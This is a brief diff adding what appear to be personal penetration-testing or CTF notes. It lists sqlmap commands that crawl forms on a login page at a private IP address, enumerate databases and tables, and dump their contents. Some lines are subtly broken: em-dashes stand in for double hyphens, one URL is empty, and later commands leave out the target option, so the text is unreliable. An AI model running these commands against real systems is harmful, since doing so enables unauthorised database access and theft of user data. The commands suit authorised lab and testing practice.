@@ -1,0 +1,7 @@
+sqlmap -u '10.0.10.38/login.php' —forms —crawl=2 —batch —dump
+
+sqlmap -u ''
+
+sqlmap -r reg --dbs
+sqlmap -D name_db --tables
+sqlmap -D name_db -T name_table --dump
